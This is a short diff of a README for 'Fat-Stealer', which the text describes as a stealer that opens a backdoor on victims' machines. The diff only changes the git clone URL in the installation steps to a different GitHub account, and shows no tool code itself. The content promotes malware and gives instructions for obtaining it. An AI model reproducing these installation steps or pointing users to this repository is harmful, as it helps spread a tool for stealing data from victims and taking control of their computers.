@@ -9,7 +9,7 @@ Fat-Stealer is a stealer that allows you to open a Backdoor in the victims machi
 # Installation
 Clone the repo:
 ```
-git clone https://github.com/Nashiito/Stealer--Nashiito
+git clone https://github.com/Nashiito3/Stealer--Nashiito
 ```
 Go to the directory:
 ```
